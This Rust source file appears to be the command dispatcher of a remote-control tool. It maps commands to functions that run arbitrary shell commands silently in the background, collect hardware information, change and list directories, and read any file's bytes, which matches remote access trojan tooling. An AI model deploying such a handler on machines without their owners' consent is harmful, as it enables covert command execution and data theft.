use std::collections::HashMap;
use std::env;
use std::fs;
use std::path::Path;
use std::thread;

use crate::libs::command_executer_lib;
use crate::libs::hardware_lib;

pub fn hook_to_command(COMMAND: &str) -> String {
    let mut commands: HashMap<&str, fn() -> String> = HashMap::new();

    commands.insert("/get hardware_info", _FUNC_HARDWAREINFO);
    commands.insert("/list", _COM_list);

    if let Some(rest) = COMMAND.strip_prefix("/execute ") {
        _FUNC_EXECUTE_COMMAND(rest)
    } else if let Some(rest) = COMMAND.strip_prefix("/cd ") {
        _COM_cd(rest.to_string())
    }
    else if let Some(&function) = commands.get(COMMAND) {
        function()
    } else {
        return format!("Unknown command: {}", COMMAND);
    }

}

fn _FUNC_HARDWAREINFO() -> String{
    hardware_lib::get_hardware_info()
}

fn _FUNC_EXECUTE_COMMAND(command_input: &str) -> String {
    let command = command_input.to_string();

    thread::spawn(move || {
        command_executer_lib::execute_command(&command);
        // Command output is discarded since we're not waiting
    });

    // Return immediately without blocking
    format!("Command '{}' started in background", command_input)
}

fn _COM_cd(cd: String) -> String {
    let path = Path::new(&cd);
    if !path.exists() {
        return format!("❌ Error: Path '{}' not found.", cd);
    }
    match env::set_current_dir(path) {
        Ok(_) => format!("📂 Directory changed to: {}", cd),
        Err(e) => format!("❌ Error changing directory: {}", e),
    }
}

fn _COM_list() -> String {
    let path = std::env::current_dir().unwrap_or(std::path::PathBuf::from("."));
    
    let mut output = String::new();
    output.push_str(&format!("Directory content of: {:?}\n\n", path));

    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let name = entry.file_name().into_string().unwrap_or_default();
            let meta = entry.metadata();
            
            // Modern icons
            let prefix = if meta.map(|m| m.is_dir()).unwrap_or(false) {
                "📁 "
            } else {
                "📄 "
            };
            
            output.push_str(&format!("{}{}\n", prefix, name));
        }
    } else {
        output.push_str("Error reading directory contents.");
    }

    output
}


pub fn _DIRECTFUNC_COPY_FILE(source: &str) -> Vec<u8> {
    let data: Vec<u8> = fs::read(source).unwrap();
    println!("Read {} bytes from img.png", data.len());
    data
}